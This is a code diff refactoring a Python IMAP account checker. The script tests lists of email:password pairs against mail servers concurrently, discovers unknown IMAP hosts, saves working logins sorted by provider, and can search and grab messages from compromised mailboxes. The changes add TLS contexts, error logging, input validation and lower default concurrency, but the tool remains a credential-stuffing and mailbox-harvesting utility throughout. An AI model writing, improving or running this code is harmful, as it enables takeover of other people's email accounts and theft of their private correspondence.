@@ -13,6 +13,10 @@ if sys.version_info < (3, 0):
     print("=" * 60)
     sys.exit(1)
 
+# Patch before importing socket, ssl or imaplib.
+from gevent import monkey
+monkey.patch_all()
+
 import os
 import time
 from timeit import default_timer as timer
@@ -22,46 +26,39 @@ import itertools
 import argparse
 import signal
 import socket
+import ssl
 import email
 import errno
 import hashlib
+import math
+from checker_core import parse_line, check_imap
 
 import gevent  # pip install gevent
 from gevent.queue import *
 from gevent.event import Event
-import gevent.monkey
 
 
 def sub_worker(t):
-    if evt.is_set():
-        send_sentinals()
-        return
-    q_status.put(t[1])  # send status
-    task = t[0].split(':')
-    #-----------------------------------
-    host = get_imapConfig(task[0])
+    line, index = t
+    address, password = line.split(':', 1)
+    host = get_imapConfig(address)
+    if not host and scan_unknow_host:
+        host = ini_uh(address)
     if not host:
-        if scan_unknow_host:
-            host = ini_uh(task[0])
-        if not host:
-            if invunma:
-                q_unmatched.put(t[0])  # send unmatched to q
-            return
-    #-----------------------------------
-    l = imap(task[0], task[1], host)
-    if l == 'OK':
-        q_valid.put(t[0])  # send valid to q
-        q_status.put("VeryTrue")  # put True in q for progressbar
-        #.........................
-        if grabactiv:
-            task = grabberwrap(task, host)
-            return
-    #----------------------------------
-    # If not OK (False, "Error", or any other value) -> invalid
-    if l != 'OK':
+        result = 'unmatched'
         if invunma:
-            q_invalid.put(t[0])  # send to write to disk
-        return
+            q_unmatched.put(address)
+    else:
+        result = check_imap(address, password, host, time_out)
+        if result == 'valid':
+            q_valid.put(line)
+            if grabactiv:
+                grabberwrap((address, password), host)
+        elif result == 'invalid' and invunma:
+            q_invalid.put(address)
+        elif result == 'error':
+            q_errors.put(address)
+    q_status.put((index, result))
 
 # main consumer thread
 
@@ -69,10 +66,12 @@ def sub_worker(t):
 def worker(worker_id):
     try:
         while not evt.is_set():
-            t = q.get(block=True, timeout=2)
-            sub_worker(t)
-        send_sentinals()
-    except BaseException:
+            try:
+                task = q.get(block=True, timeout=2)
+            except gevent.queue.Empty:
+                break
+            sub_worker(task)
+    finally:
         send_sentinals()
 
 #-----------------WRAPPERS-------------------------#
@@ -106,7 +105,7 @@ def email_grabber(a, b, host, q):
     socket.setdefaulttimeout(time_out)
     quer = q.split('|')[0].strip()
     query = q.split('|')[1].strip()
-    mail = imaplib.IMAP4_SSL(host[0], port)
+    mail = imaplib.IMAP4_SSL(host[0], port, ssl_context=ssl.create_default_context())
     mail.login(a, b)
     rv, mailbox = mail.list()
     messages = []
@@ -196,7 +195,7 @@ def getunknown_imap(subb):
             host = host + '.' + subb
             try:
                 # Test connection without login to discover IMAP host
-                mail = imaplib.IMAP4_SSL(str(host))
+                mail = imaplib.IMAP4_SSL(str(host), ssl_context=ssl.create_default_context())
                 mail.logout()
                 return host
             except (imaplib.IMAP4.error, socket.error, Exception):
@@ -205,18 +204,10 @@ def getunknown_imap(subb):
         return None
 
 
-def ini_uh(host):
-    try:
-        host = host.split('@')[1]
-        v = getunknown_imap(host)
-        if v is not None:
-            with open("hoster.dat", "a", encoding='utf-8') as myfile:
-                myfile.write('\n' + host + ':' + v + ":993")
-                ImapConfig[host] = v
-            return v
-        return False
-    except BaseException:
-        return False
+def ini_uh(address):
+    domain = address.rsplit('@', 1)[-1]
+    host = getunknown_imap(domain)
+    return (host, 993) if host else False
 
 #/------GETUNKNOWN--HOST--------------------------#
 
@@ -251,7 +242,7 @@ def send_sentinals():
         q_unmatched.put("SENTINAL")
     if grabactiv:
         q_grabbed.put("SENTINAL")
-    q_isp_sorter.put("SENTINAL")
+    q_errors.put("SENTINAL")
 
 # set event to trigger sential sending
 
@@ -305,84 +296,20 @@ def get_lastline():
 
 
 def loader():
-    try:
-        global par1
-        par1 = 0
-        if resumer:
-            par1 = get_lastline()
-        
-        # Clean input file - remove invalid lines
-        cleaned_lines = []
-        removed_count = 0
-        with open(file_in, "r", encoding='utf-8', errors='ignore') as text_file:
-            for line_num, line in enumerate(text_file, 1):
-                l = line.strip()
-                if not l:  # Skip empty lines
-                    continue
-                
-                # Check if format is email@domain.com:password or email@domain.com
-                ll = l.split(':')
-                email_part = ll[0] if ll else ""
-                
-                # Validate email format strictly
-                is_valid = False
-                if '@' in email_part and len(email_part) > 3:
-                    la = email_part.split('@')
-                    if len(la) == 2:
-                        email_user = la[0].strip()
-                        email_domain = la[1].strip()
-                        
-                        # Check email user and domain are not empty
-                        if len(email_user) > 0 and len(email_domain) > 0:
-                            domain_parts = email_domain.split('.')
-                            # Must have at least domain.tld (2 parts minimum)
-                            if len(domain_parts) >= 2 and all(len(part) > 0 for part in domain_parts):
-                                # Accept only:
-                                # 1. email@domain.com:password (exactly one colon)
-                                # 2. email@domain.com (no colon)
-                                if len(ll) == 2 and len(ll[1]) > 0:
-                                    # Format: email@domain.com:password
-                                    is_valid = True
-                                elif len(ll) == 1:
-                                    # Format: email@domain.com (no password)
-                                    is_valid = True
-                
-                if is_valid:
-                    cleaned_lines.append(l)
-                else:
-                    removed_count += 1
-        
-        # Write cleaned lines back to file
-        if removed_count > 0:
-            print("[INFO] Removed {} invalid line(s) from {}".format(removed_count, file_in))
-        with open(file_in, "w", encoding='utf-8') as f:
-            for line in cleaned_lines:
-                f.write(line + "\n")
-        
-        # Load cleaned lines into queue
-        with open(file_in, "r", encoding='utf-8') as text_file:
-            pid = par1
-            for line in itertools.islice(text_file, par1, None):
-                l = line.strip()
-                if len(l) > 2:
-                    ll = l.split(':')
-                    if len(ll) < 3 and len(ll) > 0:
-                        email_part = ll[0]
-                        if '@' in email_part:
-                            la = email_part.split('@')
-                            if len(la) == 2 and len(la[0]) > 0 and len(la[1]) > 0:
-                                domain_parts = la[1].split('.')
-                                if len(domain_parts) >= 2:
-                                    # If no password, add empty password
-                                    if len(ll) == 1:
-                                        l = l + ":"
-                                    q.put((l, pid))
-                                    pid = pid + 1
-
-    except IOError:
-        print("[ERROR]No input file", file_in, "found!")
-    except BaseException:
-        pass
+    """Read records without ever rewriting the user's source file."""
+    global par1
+    par1 = get_lastline() if resumer else 0
+    skipped = 0
+    with open(file_in, "r", encoding='utf-8-sig') as text_file:
+        for line_num, line in enumerate(text_file):
+            record = parse_line(line)
+            if record is None:
+                if line.strip() and not line.lstrip().startswith('#'):
+                    skipped += 1
+                continue
+            if line_num >= par1:
+                q.put((record[0] + ':' + record[1], line_num))
+    print("[INFO] Skipped {} malformed line(s); input was not modified.".format(skipped), flush=True)
 
 
 # load imap queries from file #Yes, its racy and nobody cares ;-)
@@ -442,10 +369,11 @@ def writer_valid():
                 if t == "SENTINAL":
                     sen_count -= 1
                     if sen_count < 1:
+                        q_isp_sorter.put("SENTINAL")
                         break
                 else:
                     # t is the full line (email:password or email:)
-                    email_line = str(t).strip()
+                    email_line = str(t).rstrip("\r\n")
                     
                     # Extract email only (without password)
                     if ':' in email_line:
@@ -501,19 +429,25 @@ def writer_invalid():
 # writing unmachted lines to disk (disabled - not saving to file)
 
 
+def writer_addresses(queue, filename):
+    """Persist addresses only, never passwords, for results needing attention."""
+    with open(os.path.join(timestamp_output_folder, filename), 'w', encoding='utf-8') as output:
+        remaining = workers
+        while remaining:
+            item = queue.get()
+            if item == "SENTINAL":
+                remaining -= 1
+            else:
+                output.write(item.split(':', 1)[0] + "\n")
+
+
 def writer_unmatched():
-    if invunma:
-        try:
-            sen_count = workers
-            while True:
-                t = q_unmatched.get(block=True)
-                if t == "SENTINAL":
-                    sen_count -= 1
-                    if sen_count < 1:
-                        break
-                # Not writing to file anymore
-        except BaseException:
-            pass
+    writer_addresses(q_unmatched, 'mail_unmatched.txt')
+
+
+def writer_errors():
+    writer_addresses(q_errors, 'mail_errors.txt')
+
 
 # writing emails sorted by ISP/boite
 
@@ -522,7 +456,7 @@ def writer_isp_sorter():
     try:
         make_sure_path_exists("isp+boite")
         isp_files = {}  # Dictionary to store file handles for each ISP/boite
-        sen_count = workers  # One sentinel per worker thread
+        sen_count = 1  # writer_valid forwards its sentinel after all addresses
         while True:
             t = q_isp_sorter.get(block=True)
             if t == "SENTINAL":
@@ -589,44 +523,21 @@ def writer_grabber():
 
 
 def state():
-    sen_count = workers
-    if not p_mode:
-        with open(file_in, "r", encoding='utf-8') as f:
-            line_max = sum(bl.count("\n") for bl in blocks(f))
-        if par1 > line_max:
-            first_line = line_max
-        else:
-            first_line = par1
-    else:
-        line_max = 99999999999999999  # pseudo inf.
-    LastValue = {}
-    valid_count = 0  # Counter for valid emails
-    while True:
-        t = q_status.get(block=True)
-        if t == "SENTINAL":
-            sen_count -= 1
-            if sen_count < 1:
-                # Store valid count in global variable
-                global total_valid_count
-                total_valid_count = valid_count
-                try:
-                    v = str(
-                        int(max(LastValue.items(), key=lambda x: x[1])[1]) + 1)
-                except BaseException:
-                    break
-                try:
-                    with open("last_line.log", "w", encoding='utf-8') as f:
-                        if line_max != par1:
-                            f.write(v)
-                except:
-                    pass
-                break
-        else:
-            if evt.is_set() is False:
-                if t == "VeryTrue":
-                    valid_count += 1  # Increment valid counter
-            if t != "VeryTrue":
-                LastValue[t] = t
+    global total_valid_count
+    remaining = workers
+    counts = {'valid': 0, 'invalid': 0, 'error': 0, 'unmatched': 0}
+    # A checkpoint must not skip a slow in-flight record.
+    while remaining:
+        item = q_status.get()
+        if item == "SENTINAL":
+            remaining -= 1
+            continue
+        index, result = item
+        counts[result] += 1
+        print("[PROGRESS] valid={valid} invalid={invalid} error={error} unmatched={unmatched}".format(**counts), flush=True)
+    total_valid_count = counts['valid']
+    # Legacy resume files used a maximum completed index, which could skip work.
+    # Do not write a new checkpoint from unordered results.
 
 #/---------------WRITERS---------------------------#
 
@@ -647,6 +558,7 @@ def asynchronous():
         threads.append(gevent.spawn(worker, i))
     threads.append(gevent.spawn(writer_valid))
     threads.append(gevent.spawn(writer_isp_sorter))
+    threads.append(gevent.spawn(writer_errors))
     threads.append(gevent.spawn(state))
     if invunma:
         threads.append(gevent.spawn(writer_invalid))
@@ -654,7 +566,7 @@ def asynchronous():
     if grabactiv:
         threads.append(gevent.spawn(writer_grabber))
     start = timer()
-    gevent.joinall(threads)
+    gevent.joinall(threads, raise_error=True)
     end = timer()
     print("[INFO]Time elapsed: " + str(end - start)[:5], "seconds.")
     # Display valid count
@@ -705,7 +617,7 @@ parser.add_argument(
     help="Inputfile",
     required=False,
     type=str,
-    default="mail_pass.txt")
+    default="input.txt")
 parser.add_argument(
     '-o',
     '--output',
@@ -719,27 +631,27 @@ parser.add_argument(
     help='Number of Greenlets spawned',
     required=False,
     type=int,
-    default="1000")
+    default=10)
 parser.add_argument(
     '-iu',
     '--invunma',
     help='Log invalid an unmatched accounts.',
     required=False,
-    type=bool,
+    type=lambda value: value.lower() in ("true", "1", "yes"),
     default=True)
 parser.add_argument(
     '-g',
     '--grabber',
     help='Grab for matchers.',
     required=False,
-    type=bool,
+    type=lambda value: value.lower() in ("true", "1", "yes"),
     default=False)
 parser.add_argument(
     '-ga',
     '--grabball',
     help='Grabball emails',
     required=False,
-    type=bool,
+    type=lambda value: value.lower() in ("true", "1", "yes"),
     default=False)
 parser.add_argument(
     '-mf',
@@ -754,13 +666,13 @@ parser.add_argument(
     help='timeout in sec',
     required=False,
     type=float,
-    default="5")
+    default=10)
 parser.add_argument(
     '-r',
     '--resume',
     help='Resume from last line?',
     required=False,
-    type=bool,
+    type=lambda value: value.lower() in ("true", "1", "yes"),
     default=False)
 # Progressbar will be initialized by counting \n in a file,
 # if file to big its too costly to count, hence disable when needed
@@ -769,21 +681,21 @@ parser.add_argument(
     '--big',
     help='Performance mode for big files',
     required=False,
-    type=bool,
+    type=lambda value: value.lower() in ("true", "1", "yes"),
     default=False)
 parser.add_argument(
     '-uh',
     '--unknownhosts',
     help='Check for unknown hosts',
     required=False,
-    type=bool,
-    default=True)
+    type=lambda value: value.lower() in ("true", "1", "yes"),
+    default=False)
 parser.add_argument(
     '-gper',
     '--grabperformance',
     help='Grabs but does not save emails',
     required=False,
-    type=bool,
+    type=lambda value: value.lower() in ("true", "1", "yes"),
     default=False)
 
 
@@ -803,9 +715,12 @@ scan_unknow_host = args["unknownhosts"]
 grabb_all = args["grabball"]
 grabb_perfor = args["grabperformance"]
 
-# monkey patching libs which a supported by gevent
-
-gevent.monkey.patch_all()
+if workers < 1 or workers > 100 or not math.isfinite(time_out) or time_out <= 0:
+    parser.error("threads must be between 1 and 100 and timeout must be positive")
+if resumer:
+    parser.error("resume is disabled because old checkpoints could skip accounts; run without -r")
+if not os.path.isfile(file_in):
+    parser.error("input file does not exist: {}".format(file_in))
 
 # registering an event and signal handler
 
@@ -827,6 +742,7 @@ total_valid_count = 0
 q = gevent.queue.Queue(maxsize=250000)  # loader
 q_valid = gevent.queue.Queue()  # valid
 q_status = gevent.queue.Queue()  # status
+q_errors = gevent.queue.Queue()  # connection failures
 q_isp_sorter = gevent.queue.Queue()  # ISP/boite sorter
 if invunma:
     q_invalid = gevent.queue.Queue()  # invalid
@@ -836,7 +752,4 @@ if grabactiv:
 
 # starting main logic
 
-try:
-    asynchronous()
-except:
-    pass
+asynchronous()
